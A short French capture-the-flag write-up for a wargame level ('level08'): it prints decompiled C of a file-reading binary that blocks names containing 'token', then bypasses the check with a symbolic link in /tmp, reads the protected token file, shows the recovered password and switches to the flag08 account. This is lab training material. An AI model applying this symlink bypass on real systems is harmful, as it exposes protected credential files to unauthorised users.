On trouve un binaire est un fichier token qui contient surement le token:
on desassemble:

int main(int argc,char **argv,char **envp)
{
  char *pcVar1;
  int __fd;
  size_t __n;
  ssize_t sVar2;
  int in_GS_OFFSET;
  undefined4 *in_stack_00000008;
  int fd;
  int rc;
  char buf [1024];
  undefined1 local_414 [1024];
  int local_14;
  
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  if (argc == 1) {
    printf("%s [file to read]\n",*in_stack_00000008);
                    // WARNING: Subroutine does not return
    exit(1);
  }
  pcVar1 = strstr((char *)in_stack_00000008[1],"token");
  if (pcVar1 != (char *)0x0) {
    printf("You may not access \'%s\'\n",in_stack_00000008[1]);
                    // WARNING: Subroutine does not return
    exit(1);
  }
  __fd = open((char *)in_stack_00000008[1],0);
  if (__fd == -1) {
    err(1,"Unable to open %s",in_stack_00000008[1]);
  }
  __n = read(__fd,local_414,0x400);
  if (__n == 0xffffffff) {
    err(1,"Unable to read fd %d",__fd);
  }
  sVar2 = write(1,local_414,__n);
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
                    // WARNING: Subroutine does not return
    __stack_chk_fail();
  }
  return sVar2;
}

On comprend que ce programme prend un fichier en parametre et affiche son contenu
Il y a tout fois un soucis on vois que si le fichier s'appelle token le programme s'arrete avant la lecture
  pcVar1 = strstr((char *)in_stack_00000008[1],"token");
  if (pcVar1 != (char *)0x0) {
    printf("You may not access \'%s\'\n",in_stack_00000008[1]);
                    // WARNING: Subroutine does not return
    exit(1);
  }

il faut donc trouver un moyen de passer le fichier token en parametre sans qu' il se nome parametre

Pour sa on fait un lien symbolique dans /tmp:
    ln -s /home/user/level08/token /tmp/toto
!!!!!IL FAUT METTRE LE PATH EN ENTIER SINON CA NE MARCHE PAS!!!!!!

puis on ultilise le binaire
    ./level08 /tmp/toto
    => quif5eloekouj29ke0vouxean
on peut ensuite se connecter en tant que flag08
    su flag08
    getflag